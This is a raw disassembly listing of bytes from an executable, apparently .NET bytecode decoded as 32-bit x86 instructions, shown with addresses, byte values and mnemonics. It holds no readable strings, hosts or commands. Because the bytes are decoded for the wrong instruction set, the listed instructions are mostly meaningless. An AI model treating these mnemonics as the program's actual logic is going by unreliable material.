  403617:	01 13                	add    %edx,(%ebx)
  403619:	30 02                	xor    %al,(%edx)
  40361b:	00 43 00             	add    %al,0x0(%ebx)
  40361e:	00 00                	add    %al,(%eax)
  403620:	11 00                	adc    %eax,(%eax)
  403622:	00 11                	add    %dl,(%ecx)
  403624:	00 28                	add    %ch,(%eax)
  403626:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403627:	00 00                	add    %al,(%eax)
  403629:	0a 0a                	or     (%edx),%cl
  40362b:	00 06                	add    %al,(%esi)
  40362d:	0b 16                	or     (%esi),%edx
  40362f:	0c 2b                	or     $0x2b,%al
  403631:	27                   	daa
  403632:	07                   	pop    %es
  403633:	08 9a 0d 00 09 6f    	or     %bl,0x6f09000d(%edx)
  403639:	a8 00                	test   $0x0,%al
  40363b:	00 0a                	add    %cl,(%edx)
  40363d:	02 6f a9             	add    -0x57(%edi),%ch
  403640:	00 00                	add    %al,(%eax)
  403642:	0a 28                	or     (%eax),%ch
  403644:	aa                   	stos   %al,%es:(%edi)
  403645:	00 00                	add    %al,(%eax)
  403647:	0a 13                	or     (%ebx),%dl
  403649:	04 11                	add    $0x11,%al
  40364b:	04 2c                	add    $0x2c,%al
  40364d:	06                   	push   %es
  40364e:	00 09                	add    %cl,(%ecx)
  403650:	13 05 2b 10 00 08    	adc    0x800102b,%eax
  403656:	17                   	pop    %ss
  403657:	58                   	pop    %eax
  403658:	0c 08                	or     $0x8,%al
  40365a:	07                   	pop    %es
  40365b:	8e 69 32             	mov    0x32(%ecx),%gs
  40365e:	d3 14 13             	rcll   %cl,(%ebx,%edx,1)
  403661:	05 2b 00 11 05       	add    $0x511002b,%eax
  403666:	2a 00                	sub    (%eax),%al
  403668:	1b 30                	sbb    (%eax),%esi
  40366a:	01 00                	add    %eax,(%eax)
  40366c:	16                   	push   %ss
	...
  403675:	00 20                	add    %ah,(%eax)
  403677:	03 00                	add    (%eax),%eax
  403679:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  40367f:	06                   	push   %es
  403680:	26 00 de             	es add %bl,%dh
  403683:	05 26 00 00 de       	add    $0xde000026,%eax
  403688:	00 2a                	add    %ch,(%edx)
  40368a:	00 00                	add    %al,(%eax)
  40368c:	01 10                	add    %edx,(%eax)
  40368e:	00 00                	add    %al,(%eax)
  403690:	00 00                	add    %al,(%eax)
  403692:	01 00                	add    %eax,(%eax)
  403694:	0f 10 00             	movups (%eax),%xmm0
  403697:	05 0f 00 00 01       	add    $0x100000f,%eax
  40369c:	1b 30                	sbb    (%eax),%esi
  40369e:	03 00                	add    (%eax),%eax
  4036a0:	42                   	inc    %edx
  4036a1:	00 00                	add    %al,(%eax)
  4036a3:	00 12                	add    %dl,(%edx)
  4036a5:	00 00                	add    %al,(%eax)
  4036a7:	11 00                	adc    %eax,(%eax)
  4036a9:	00 20                	add    %ah,(%eax)
  4036ab:	00 01                	add    %al,(%ecx)
  4036ad:	00 00                	add    %al,(%eax)
  4036af:	73 ab                	jae    0x40365c
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	0a 0a                	or     (%edx),%cl
  4036b5:	28 38                	sub    %bh,(%eax)
  4036b7:	00 00                	add    %al,(%eax)
  4036b9:	06                   	push   %es
  4036ba:	0b 07                	or     (%edi),%eax
  4036bc:	06                   	push   %es
  4036bd:	20 00                	and    %al,(%eax)
  4036bf:	01 00                	add    %eax,(%eax)
  4036c1:	00 28                	add    %ch,(%eax)
  4036c3:	39 00                	cmp    %eax,(%eax)
  4036c5:	00 06                	add    %al,(%esi)
  4036c7:	16                   	push   %ss
  4036c8:	fe 02                	incb   (%edx)
  4036ca:	0c 08                	or     $0x8,%al
  4036cc:	2c 0a                	sub    $0xa,%al
  4036ce:	00 06                	add    %al,(%esi)
  4036d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4036d1:	33 00                	xor    (%eax),%eax
  4036d3:	00 0a                	add    %cl,(%edx)
  4036d5:	0d de 10 00 de       	or     $0xde0010de,%eax
  4036da:	05 26 00 00 de       	add    $0xde000026,%eax
  4036df:	00 72 e3             	add    %dh,-0x1d(%edx)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	70 0d                	jo     0x4036f3
  4036e6:	2b 00                	sub    (%eax),%eax
  4036e8:	09 2a                	or     %ebp,(%edx)
  4036ea:	00 00                	add    %al,(%eax)
  4036ec:	01 10                	add    %edx,(%eax)
  4036ee:	00 00                	add    %al,(%eax)
  4036f0:	00 00                	add    %al,(%eax)
  4036f2:	01 00                	add    %eax,(%eax)
  4036f4:	32 33                	xor    (%ebx),%dh
  4036f6:	00 05 0f 00 00 01    	add    %al,0x100000f
  4036fc:	13 30                	adc    (%eax),%esi
  4036fe:	03 00                	add    (%eax),%eax
  403700:	19 00                	sbb    %eax,(%eax)
  403702:	00 00                	add    %al,(%eax)
  403704:	0a 00                	or     (%eax),%al
  403706:	00 11                	add    %dl,(%ecx)
  403708:	00 16                	add    %dl,(%esi)
  40370a:	7e 08                	jle    0x403714
  40370c:	00 00                	add    %al,(%eax)
  40370e:	04 12                	add    $0x12,%al
  403710:	00 73 ac             	add    %dh,-0x54(%ebx)
  403713:	00 00                	add    %al,(%eax)
  403715:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  40371b:	06                   	push   %es
  40371c:	0b 2b                	or     (%ebx),%ebp
  40371e:	00 07                	add    %al,(%edi)
  403720:	2a 00                	sub    (%eax),%al
  403722:	00 00                	add    %al,(%eax)
  403724:	13 30                	adc    (%eax),%esi
  403726:	02 00                	add    (%eax),%al
  403728:	21 00                	and    %eax,(%eax)
  40372a:	00 00                	add    %al,(%eax)
  40372c:	02 00                	add    (%eax),%al
  40372e:	00 11                	add    %dl,(%ecx)
  403730:	00 7e 1e             	add    %bh,0x1e(%esi)
  403733:	00 00                	add    %al,(%eax)
  403735:	04 14                	add    $0x14,%al
  403737:	fe 03                	incb   (%ebx)
  403739:	0a 06                	or     (%esi),%al
  40373b:	2c 13                	sub    $0x13,%al
  40373d:	00 7e 1e             	add    %bh,0x1e(%esi)
  403740:	00 00                	add    %al,(%eax)
  403742:	04 6f                	add    $0x6f,%al
  403744:	ad                   	lods   %ds:(%esi),%eax
  403745:	00 00                	add    %al,(%eax)
  403747:	0a 00                	or     (%eax),%al
  403749:	14 80                	adc    $0x80,%al
  40374b:	1e                   	push   %ds
  40374c:	00 00                	add    %al,(%eax)
  40374e:	04 00                	add    $0x0,%al
  403750:	2a 00                	sub    (%eax),%al
  403752:	00 00                	add    %al,(%eax)
  403754:	13 30                	adc    (%eax),%esi
  403756:	01 00                	add    %eax,(%eax)
  403758:	20 00                	and    %al,(%eax)
  40375a:	00 00                	add    %al,(%eax)
  40375c:	02 00                	add    (%eax),%al
  40375e:	00 11                	add    %dl,(%ecx)
  403760:	00 7e 0f             	add    %bh,0xf(%esi)
  403763:	00 00                	add    %al,(%eax)
  403765:	04 28                	add    $0x28,%al
  403767:	13 00                	adc    (%eax),%eax
  403769:	00 0a                	add    %cl,(%edx)
  40376b:	2c 07                	sub    $0x7,%al
  40376d:	28 30                	sub    %dh,(%eax)
  40376f:	00 00                	add    %al,(%eax)
  403771:	06                   	push   %es
  403772:	2b 01                	sub    (%ecx),%eax
  403774:	16                   	push   %ss
  403775:	0a 06                	or     (%esi),%al
  403777:	2c 06                	sub    $0x6,%al
  403779:	28 40 00             	sub    %al,0x0(%eax)
  40377c:	00 06                	add    %al,(%esi)
  40377e:	00 2a                	add    %ch,(%edx)
  403780:	1b 30                	sbb    (%eax),%esi
  403782:	03 00                	add    (%eax),%eax
  403784:	2c 00                	sub    $0x0,%al
	...
  40378e:	14 fe                	adc    $0xfe,%al
  403790:	06                   	push   %es
  403791:	3e 00 00             	add    %al,%ds:(%eax)
  403794:	06                   	push   %es
  403795:	73 ae                	jae    0x403745
  403797:	00 00                	add    %al,(%eax)
  403799:	0a 28                	or     (%eax),%ch
  40379b:	af                   	scas   %es:(%edi),%eax
  40379c:	00 00                	add    %al,(%eax)
  40379e:	0a 00                	or     (%eax),%al
  4037a0:	28 b0 00 00 0a 00    	sub    %dh,0xa0000(%eax)
  4037a6:	17                   	pop    %ss
  4037a7:	16                   	push   %ss
  4037a8:	16                   	push   %ss
  4037a9:	28 3d 00 00 06 00    	sub    %bh,0x60000
  4037af:	00 de                	add    %bl,%dh
  4037b1:	05 26 00 00 de       	add    $0xde000026,%eax
  4037b6:	00 2a                	add    %ch,(%edx)
  4037b8:	01 10                	add    %edx,(%eax)
  4037ba:	00 00                	add    %al,(%eax)
  4037bc:	00 00                	add    %al,(%eax)
  4037be:	01 00                	add    %eax,(%eax)
  4037c0:	25 26 00 05 0f       	and    $0xf050026,%eax
  4037c5:	00 00                	add    %al,(%eax)
  4037c7:	01 1b                	add    %ebx,(%ebx)
  4037c9:	30 03                	xor    %al,(%ebx)
  4037cb:	00 24 00             	add    %ah,(%eax,%eax,1)
  4037ce:	00 00                	add    %al,(%eax)
  4037d0:	02 00                	add    (%eax),%al
  4037d2:	00 11                	add    %dl,(%ecx)
  4037d4:	00 00                	add    %al,(%eax)
  4037d6:	16                   	push   %ss
  4037d7:	16                   	push   %ss
  4037d8:	16                   	push   %ss
  4037d9:	28 3d 00 00 06 00    	sub    %bh,0x60000
  4037df:	00 de                	add    %bl,%dh
  4037e1:	15 26 00 2b 0d       	adc    $0xd2b0026,%eax
  4037e6:	00 20                	add    %ah,(%eax)
  4037e8:	a0 86 01 00 28       	mov    0x28000186,%al
  4037ed:	10 00                	adc    %al,(%eax)
  4037ef:	00 0a                	add    %cl,(%edx)
  4037f1:	00 00                	add    %al,(%eax)
  4037f3:	17                   	pop    %ss
  4037f4:	0a 2b                	or     (%ebx),%ch
  4037f6:	ef                   	out    %eax,(%dx)
  4037f7:	2a 01                	sub    (%ecx),%al
  4037f9:	10 00                	adc    %al,(%eax)
  4037fb:	00 00                	add    %al,(%eax)
  4037fd:	00 01                	add    %al,(%ecx)
  4037ff:	00 0d 0e 00 15 0f    	add    %cl,0xf15000e
  403805:	00 00                	add    %al,(%eax)
  403807:	01 1b                	add    %ebx,(%ebx)
  403809:	30 04 00             	xor    %al,(%eax,%eax,1)
  40380c:	44                   	inc    %esp
  40380d:	00 00                	add    %al,(%eax)
  40380f:	00 14 00             	add    %dl,(%eax,%eax,1)
  403812:	00 11                	add    %dl,(%ecx)
  403814:	00 00                	add    %al,(%eax)
  403816:	7e 65                	jle    0x40387d
  403818:	00 00                	add    %al,(%eax)
  40381a:	0a 7e 1f             	or     0x1f(%esi),%bh
  40381d:	00 00                	add    %al,(%eax)
  40381f:	04 18                	add    $0x18,%al
  403821:	6f                   	outsl  %ds:(%esi),(%dx)
  403822:	b1 00                	mov    $0x0,%cl
  403824:	00 0a                	add    %cl,(%edx)
  403826:	0a 00                	or     (%eax),%al
  403828:	06                   	push   %es
  403829:	02 03                	add    (%ebx),%al
  40382b:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
  40382e:	00 00                	add    %al,(%eax)
  403830:	0a 00                	or     (%eax),%al
  403832:	17                   	pop    %ss
  403833:	0b de                	or     %esi,%ebx
  403835:	20 06                	and    %al,(%esi)
  403837:	2c 07                	sub    $0x7,%al
  403839:	06                   	push   %es
  40383a:	6f                   	outsl  %ds:(%esi),(%dx)
  40383b:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403840:	dc 0c 00             	fmull  (%eax,%eax,1)
  403843:	08 6f 75             	or     %ch,0x75(%edi)
  403846:	00 00                	add    %al,(%eax)
  403848:	0a 28                	or     (%eax),%ch
  40384a:	49                   	dec    %ecx
  40384b:	00 00                	add    %al,(%eax)
  40384d:	06                   	push   %es
  40384e:	00 00                	add    %al,(%eax)
  403850:	de 00                	fiadds (%eax)
  403852:	16                   	push   %ss
  403853:	0b 2b                	or     (%ebx),%ebp
  403855:	00 07                	add    %al,(%edi)
  403857:	2a 01                	sub    (%ecx),%al
  403859:	1c 00                	sbb    $0x0,%al
  40385b:	00 02                	add    %al,(%edx)
  40385d:	00 13                	add    %dl,(%ebx)
  40385f:	00 0f                	add    %cl,(%edi)
  403861:	22 00                	and    (%eax),%al
  403863:	0b 00                	or     (%eax),%eax
  403865:	00 00                	add    %al,(%eax)
  403867:	00 00                	add    %al,(%eax)
  403869:	00 01                	add    %al,(%ecx)
  40386b:	00 2c 2d 00 11 12 00 	add    %ch,0x121100(,%ebp,1)
  403872:	00 01                	add    %al,(%ecx)
  403874:	1b 30                	sbb    (%eax),%esi
  403876:	02 00                	add    (%eax),%al
  403878:	46                   	inc    %esi
  403879:	00 00                	add    %al,(%eax)
  40387b:	00 15 00 00 11 00    	add    %dl,0x110000
  403881:	00 7e 65             	add    %bh,0x65(%esi)
  403884:	00 00                	add    %al,(%eax)
  403886:	0a 7e 1f             	or     0x1f(%esi),%bh
  403889:	00 00                	add    %al,(%eax)
  40388b:	04 6f                	add    $0x6f,%al
  40388d:	b3 00                	mov    $0x0,%bl
  40388f:	00 0a                	add    %cl,(%edx)
  403891:	0a 00                	or     (%eax),%al
  403893:	06                   	push   %es
  403894:	02 6f b4             	add    -0x4c(%edi),%ch
  403897:	00 00                	add    %al,(%eax)
  403899:	0a 0b                	or     (%ebx),%cl
  40389b:	07                   	pop    %es
  40389c:	74 02                	je     0x4038a0
  40389e:	00 00                	add    %al,(%eax)
  4038a0:	1b 0c de             	sbb    (%esi,%ebx,8),%ecx
  4038a3:	20 06                	and    %al,(%esi)
  4038a5:	2c 07                	sub    $0x7,%al
  4038a7:	06                   	push   %es
  4038a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4038a9:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4038ae:	dc 0d 00 09 6f 75    	fmull  0x756f0900
  4038b4:	00 00                	add    %al,(%eax)
  4038b6:	0a 28                	or     (%eax),%ch
  4038b8:	49                   	dec    %ecx
  4038b9:	00 00                	add    %al,(%eax)
  4038bb:	06                   	push   %es
  4038bc:	00 00                	add    %al,(%eax)
  4038be:	de 00                	fiadds (%eax)
  4038c0:	14 0c                	adc    $0xc,%al
  4038c2:	2b 00                	sub    (%eax),%eax
  4038c4:	08 2a                	or     %ch,(%edx)
  4038c6:	00 00                	add    %al,(%eax)
  4038c8:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4038cb:	00 02                	add    %al,(%edx)
  4038cd:	00 12                	add    %dl,(%edx)
  4038cf:	00 12                	add    %dl,(%edx)
  4038d1:	24 00                	and    $0x0,%al
  4038d3:	0b 00                	or     (%eax),%eax
  4038d5:	00 00                	add    %al,(%eax)
  4038d7:	00 00                	add    %al,(%eax)
  4038d9:	00 01                	add    %al,(%ecx)
  4038db:	00 2e                	add    %ch,(%esi)
  4038dd:	2f                   	das
  4038de:	00 11                	add    %dl,(%ecx)
  4038e0:	12 00                	adc    (%eax),%al
  4038e2:	00 01                	add    %al,(%ecx)
  4038e4:	1b 30                	sbb    (%eax),%esi
  4038e6:	02 00                	add    (%eax),%al
  4038e8:	41                   	inc    %ecx
  4038e9:	00 00                	add    %al,(%eax)
  4038eb:	00 14 00             	add    %dl,(%eax,%eax,1)
  4038ee:	00 11                	add    %dl,(%ecx)
  4038f0:	00 00                	add    %al,(%eax)
  4038f2:	7e 65                	jle    0x403959
  4038f4:	00 00                	add    %al,(%eax)
  4038f6:	0a 7e 1f             	or     0x1f(%esi),%bh
  4038f9:	00 00                	add    %al,(%eax)
  4038fb:	04 6f                	add    $0x6f,%al
  4038fd:	b3 00                	mov    $0x0,%bl
  4038ff:	00 0a                	add    %cl,(%edx)
  403901:	0a 00                	or     (%eax),%al
  403903:	06                   	push   %es
  403904:	02 6f b5             	add    -0x4b(%edi),%ch
  403907:	00 00                	add    %al,(%eax)
  403909:	0a 00                	or     (%eax),%al
  40390b:	17                   	pop    %ss
  40390c:	0b de                	or     %esi,%ebx
  40390e:	20 06                	and    %al,(%esi)
  403910:	2c 07                	sub    $0x7,%al
  403912:	06                   	push   %es
  403913:	6f                   	outsl  %ds:(%esi),(%dx)
  403914:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403919:	dc 0c 00             	fmull  (%eax,%eax,1)
  40391c:	08 6f 75             	or     %ch,0x75(%edi)
  40391f:	00 00                	add    %al,(%eax)
  403921:	0a 28                	or     (%eax),%ch
  403923:	49                   	dec    %ecx
  403924:	00 00                	add    %al,(%eax)
  403926:	06                   	push   %es
  403927:	00 00                	add    %al,(%eax)
  403929:	de 00                	fiadds (%eax)
  40392b:	16                   	push   %ss
  40392c:	0b 2b                	or     (%ebx),%ebp
  40392e:	00 07                	add    %al,(%edi)
  403930:	2a 00                	sub    (%eax),%al
  403932:	00 00                	add    %al,(%eax)
  403934:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403937:	00 02                	add    %al,(%edx)
  403939:	00 12                	add    %dl,(%edx)
  40393b:	00 0d 1f 00 0b 00    	add    %cl,0xb001f
  403941:	00 00                	add    %al,(%eax)
  403943:	00 00                	add    %al,(%eax)
  403945:	00 01                	add    %al,(%ecx)
  403947:	00 29                	add    %ch,(%ecx)
  403949:	2a 00                	sub    (%eax),%al
  40394b:	11 12                	adc    %edx,(%edx)
  40394d:	00 00                	add    %al,(%eax)
  40394f:	01 1b                	add    %ebx,(%ebx)
  403951:	30 03                	xor    %al,(%ebx)
  403953:	00 46 00             	add    %al,0x0(%esi)
  403956:	00 00                	add    %al,(%eax)
  403958:	14 00                	adc    $0x0,%al
  40395a:	00 11                	add    %dl,(%ecx)
  40395c:	00 00                	add    %al,(%eax)
  40395e:	7e 65                	jle    0x4039c5
  403960:	00 00                	add    %al,(%eax)
  403962:	0a 72 e3             	or     -0x1d(%edx),%dh
  403965:	00 00                	add    %al,(%eax)
  403967:	70 17                	jo     0x403980
  403969:	6f                   	outsl  %ds:(%esi),(%dx)
  40396a:	b6 00                	mov    $0x0,%dh
  40396c:	00 0a                	add    %cl,(%edx)
  40396e:	0a 00                	or     (%eax),%al
  403970:	06                   	push   %es
  403971:	7e 1f                	jle    0x403992
  403973:	00 00                	add    %al,(%eax)
  403975:	04 6f                	add    $0x6f,%al
  403977:	b7 00                	mov    $0x0,%bh
  403979:	00 0a                	add    %cl,(%edx)
  40397b:	00 17                	add    %dl,(%edi)
  40397d:	0b de                	or     %esi,%ebx
  40397f:	20 06                	and    %al,(%esi)
  403981:	2c 07                	sub    $0x7,%al
  403983:	06                   	push   %es
  403984:	6f                   	outsl  %ds:(%esi),(%dx)
  403985:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40398a:	dc 0c 00             	fmull  (%eax,%eax,1)
  40398d:	08 6f 75             	or     %ch,0x75(%edi)
  403990:	00 00                	add    %al,(%eax)
  403992:	0a 28                	or     (%eax),%ch
  403994:	49                   	dec    %ecx
  403995:	00 00                	add    %al,(%eax)
  403997:	06                   	push   %es
  403998:	00 00                	add    %al,(%eax)
  40399a:	de 00                	fiadds (%eax)
  40399c:	16                   	push   %ss
  40399d:	0b 2b                	or     (%ebx),%ebp
  40399f:	00 07                	add    %al,(%edi)
  4039a1:	2a 00                	sub    (%eax),%al
  4039a3:	00 01                	add    %al,(%ecx)
  4039a5:	1c 00                	sbb    $0x0,%al
  4039a7:	00 02                	add    %al,(%edx)
  4039a9:	00 13                	add    %dl,(%ebx)
  4039ab:	00 11                	add    %dl,(%ecx)
  4039ad:	24 00                	and    $0x0,%al
  4039af:	0b 00                	or     (%eax),%eax
  4039b1:	00 00                	add    %al,(%eax)
  4039b3:	00 00                	add    %al,(%eax)
  4039b5:	00 01                	add    %al,(%ecx)
  4039b7:	00 2e                	add    %ch,(%esi)
  4039b9:	2f                   	das
  4039ba:	00 11                	add    %dl,(%ecx)
  4039bc:	12 00                	adc    (%eax),%al
  4039be:	00 01                	add    %al,(%ecx)
  4039c0:	56                   	push   %esi
  4039c1:	72 dd                	jb     0x4039a0
  4039c3:	05 00 70 7e 10       	add    $0x107e7000,%eax
  4039c8:	00 00                	add    %al,(%eax)
  4039ca:	04 28                	add    $0x28,%al
  4039cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4039cd:	00 00                	add    %al,(%eax)
  4039cf:	0a 80 1f 00 00 04    	or     0x400001f(%eax),%al
  4039d5:	2a 00                	sub    (%eax),%al
  4039d7:	00 1b                	add    %bl,(%ebx)
  4039d9:	30 03                	xor    %al,(%ebx)
  4039db:	00 10                	add    %dl,(%eax)
  4039dd:	02 00                	add    (%eax),%al
  4039df:	00 16                	add    %dl,(%esi)
  4039e1:	00 00                	add    %al,(%eax)
  4039e3:	11 00                	adc    %eax,(%eax)
  4039e5:	00 73 4d             	add    %dh,0x4d(%ebx)
  4039e8:	00 00                	add    %al,(%eax)
  4039ea:	0a 0a                	or     (%edx),%cl
  4039ec:	06                   	push   %es
  4039ed:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  4039f1:	00 1b                	add    %bl,(%ebx)
  4039f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f4:	b8 00 00 0a 00       	mov    $0xa0000,%eax
  4039f9:	06                   	push   %es
  4039fa:	72 79                	jb     0x403a75
  4039fc:	01 00                	add    %eax,(%eax)
  4039fe:	70 6f                	jo     0x403a6f
  403a00:	4e                   	dec    %esi
  403a01:	00 00                	add    %al,(%eax)
  403a03:	0a 6f b9             	or     -0x47(%edi),%ch
  403a06:	00 00                	add    %al,(%eax)
  403a08:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403a0b:	0b 07                	or     (%edi),%eax
  403a0d:	72 f1                	jb     0x403a00
  403a0f:	05 00 70 28 1f       	add    $0x1f287000,%eax
  403a14:	00 00                	add    %al,(%eax)
  403a16:	0a 2d 22 07 72 fb    	or     0xfb720722,%ch
  403a1c:	05 00 70 28 1f       	add    $0x1f287000,%eax
  403a21:	00 00                	add    %al,(%eax)
  403a23:	0a 2d 68 07 72 09    	or     0x9720768,%ch
  403a29:	06                   	push   %es
  403a2a:	00 70 28             	add    %dh,0x28(%eax)
  403a2d:	1f                   	pop    %ds
  403a2e:	00 00                	add    %al,(%eax)
  403a30:	0a 3a                	or     (%edx),%bh
  403a32:	f7 00 00 00 38 a2    	testl  $0xa2380000,(%eax)
  403a38:	01 00                	add    %eax,(%eax)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	16                   	push   %ss
  403a3d:	28 1a                	sub    %bl,(%edx)
  403a3f:	00 00                	add    %al,(%eax)
  403a41:	06                   	push   %es
  403a42:	00 73 4d             	add    %dh,0x4d(%ebx)
  403a45:	00 00                	add    %al,(%eax)
  403a47:	0a 0d 09 72 79 01    	or     0x1797209,%cl
  403a4d:	00 70 6f             	add    %dh,0x6f(%eax)
  403a50:	4e                   	dec    %esi
  403a51:	00 00                	add    %al,(%eax)
  403a53:	0a 72 f1             	or     -0xf(%edx),%dh
  403a56:	05 00 70 6f ba       	add    $0xba6f7000,%eax
  403a5b:	00 00                	add    %al,(%eax)
  403a5d:	0a 00                	or     (%eax),%al
  403a5f:	09 72 91             	or     %esi,-0x6f(%edx)
  403a62:	01 00                	add    %eax,(%eax)
  403a64:	70 6f                	jo     0x403ad5
  403a66:	4e                   	dec    %esi
  403a67:	00 00                	add    %al,(%eax)
  403a69:	0a 28                	or     (%eax),%ch
  403a6b:	17                   	pop    %ss
  403a6c:	00 00                	add    %al,(%eax)
  403a6e:	06                   	push   %es
  403a6f:	6a 6f                	push   $0x6f
  403a71:	bb 00 00 0a 00       	mov    $0xa0000,%ebx
  403a76:	09 6f 50             	or     %ebp,0x50(%edi)
  403a79:	00 00                	add    %al,(%eax)
  403a7b:	0a 28                	or     (%eax),%ch
  403a7d:	20 00                	and    %al,(%eax)
  403a7f:	00 06                	add    %al,(%esi)
  403a81:	00 16                	add    %dl,(%esi)
  403a83:	28 18                	sub    %bl,(%eax)
  403a85:	00 00                	add    %al,(%eax)
  403a87:	06                   	push   %es
  403a88:	00 38                	add    %bh,(%eax)
  403a8a:	4f                   	dec    %edi
  403a8b:	01 00                	add    %eax,(%eax)
  403a8d:	00 00                	add    %al,(%eax)
  403a8f:	00 06                	add    %al,(%esi)
  403a91:	72 1f                	jb     0x403ab2
  403a93:	06                   	push   %es
  403a94:	00 70 6f             	add    %dh,0x6f(%eax)
  403a97:	4e                   	dec    %esi
  403a98:	00 00                	add    %al,(%eax)
  403a9a:	0a 6f b9             	or     -0x47(%edi),%ch
  403a9d:	00 00                	add    %al,(%eax)
  403a9f:	0a 28                	or     (%eax),%ch
  403aa1:	42                   	inc    %edx
  403aa2:	00 00                	add    %al,(%eax)
  403aa4:	06                   	push   %es
  403aa5:	14 fe                	adc    $0xfe,%al
  403aa7:	01 13                	add    %edx,(%ebx)
  403aa9:	04 11                	add    $0x11,%al
  403aab:	04 2c                	add    $0x2c,%al
  403aad:	5d                   	pop    %ebp
  403aae:	00 7e 20             	add    %bh,0x20(%esi)
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	04 06                	add    $0x6,%al
  403ab5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ab6:	bc 00 00 0a 00       	mov    $0xa0000,%esp
  403abb:	73 4d                	jae    0x403b0a
  403abd:	00 00                	add    %al,(%eax)
  403abf:	0a 13                	or     (%ebx),%dl
  403ac1:	05 11 05 72 79       	add    $0x79720511,%eax
  403ac6:	01 00                	add    %eax,(%eax)
  403ac8:	70 6f                	jo     0x403b39
  403aca:	4e                   	dec    %esi
  403acb:	00 00                	add    %al,(%eax)
  403acd:	0a 72 27             	or     0x27(%edx),%dh
  403ad0:	06                   	push   %es
  403ad1:	00 70 6f             	add    %dh,0x6f(%eax)
  403ad4:	ba 00 00 0a 00       	mov    $0xa0000,%edx
  403ad9:	11 05 72 3d 06 00    	adc    %eax,0x63d72
  403adf:	70 6f                	jo     0x403b50
  403ae1:	4e                   	dec    %esi
  403ae2:	00 00                	add    %al,(%eax)
  403ae4:	0a 06                	or     (%esi),%al
  403ae6:	72 1f                	jb     0x403b07
  403ae8:	06                   	push   %es
  403ae9:	00 70 6f             	add    %dh,0x6f(%eax)
  403aec:	4e                   	dec    %esi
  403aed:	00 00                	add    %al,(%eax)
  403aef:	0a 6f b9             	or     -0x47(%edi),%ch
  403af2:	00 00                	add    %al,(%eax)
  403af4:	0a 6f ba             	or     -0x46(%edi),%ch
  403af7:	00 00                	add    %al,(%eax)
  403af9:	0a 00                	or     (%eax),%al
  403afb:	11 05 6f 50 00 00    	adc    %eax,0x506f
  403b01:	0a 28                	or     (%eax),%ch
  403b03:	20 00                	and    %al,(%eax)
  403b05:	00 06                	add    %al,(%esi)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	2b 07                	sub    (%edi),%eax
  403b0b:	06                   	push   %es
  403b0c:	28 47 00             	sub    %al,0x0(%edi)
  403b0f:	00 06                	add    %al,(%esi)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	de 13                	ficoms (%ebx)
  403b15:	13 06                	adc    (%esi),%eax
  403b17:	00 11                	add    %dl,(%ecx)
  403b19:	06                   	push   %es
  403b1a:	6f                   	outsl  %ds:(%esi),(%dx)
  403b1b:	75 00                	jne    0x403b1d
  403b1d:	00 0a                	add    %cl,(%edx)
  403b1f:	28 49 00             	sub    %cl,0x0(%ecx)
  403b22:	00 06                	add    %al,(%esi)
  403b24:	00 00                	add    %al,(%eax)
  403b26:	de 00                	fiadds (%eax)
  403b28:	38 b0 00 00 00 00    	cmp    %dh,0x0(%eax)
  403b2e:	06                   	push   %es
  403b2f:	72 4b                	jb     0x403b7c
  403b31:	06                   	push   %es
  403b32:	00 70 6f             	add    %dh,0x6f(%eax)
  403b35:	4e                   	dec    %esi
  403b36:	00 00                	add    %al,(%eax)
  403b38:	0a 6f b9             	or     -0x47(%edi),%ch
  403b3b:	00 00                	add    %al,(%eax)
  403b3d:	0a 06                	or     (%esi),%al
  403b3f:	72 1f                	jb     0x403b60
  403b41:	06                   	push   %es
  403b42:	00 70 6f             	add    %dh,0x6f(%eax)
  403b45:	4e                   	dec    %esi
  403b46:	00 00                	add    %al,(%eax)
  403b48:	0a 6f bd             	or     -0x43(%edi),%ch
  403b4b:	00 00                	add    %al,(%eax)
  403b4d:	0a 28                	or     (%eax),%ch
  403b4f:	41                   	inc    %ecx
  403b50:	00 00                	add    %al,(%eax)
  403b52:	06                   	push   %es
  403b53:	26 72 55             	es jb  0x403bab
  403b56:	06                   	push   %es
  403b57:	00 70 28             	add    %dh,0x28(%eax)
  403b5a:	2e 00 00             	add    %al,%cs:(%eax)
  403b5d:	0a 00                	or     (%eax),%al
  403b5f:	00 7e 20             	add    %bh,0x20(%esi)
  403b62:	00 00                	add    %al,(%eax)
  403b64:	04 28                	add    $0x28,%al
  403b66:	01 00                	add    %eax,(%eax)
  403b68:	00 2b                	add    %ch,(%ebx)
  403b6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403b6b:	bf 00 00 0a 13       	mov    $0x130a0000,%edi
  403b70:	07                   	pop    %es
  403b71:	2b 4e 12             	sub    0x12(%esi),%ecx
  403b74:	07                   	pop    %es
  403b75:	28 c0                	sub    %al,%al
  403b77:	00 00                	add    %al,(%eax)
  403b79:	0a 13                	or     (%ebx),%dl
  403b7b:	08 00                	or     %al,(%eax)
  403b7d:	11 08                	adc    %ecx,(%eax)
  403b7f:	72 1f                	jb     0x403ba0
  403b81:	06                   	push   %es
  403b82:	00 70 6f             	add    %dh,0x6f(%eax)
  403b85:	4e                   	dec    %esi
  403b86:	00 00                	add    %al,(%eax)
  403b88:	0a 6f b9             	or     -0x47(%edi),%ch
  403b8b:	00 00                	add    %al,(%eax)
  403b8d:	0a 06                	or     (%esi),%al
  403b8f:	72 4b                	jb     0x403bdc
  403b91:	06                   	push   %es
  403b92:	00 70 6f             	add    %dh,0x6f(%eax)
  403b95:	4e                   	dec    %esi
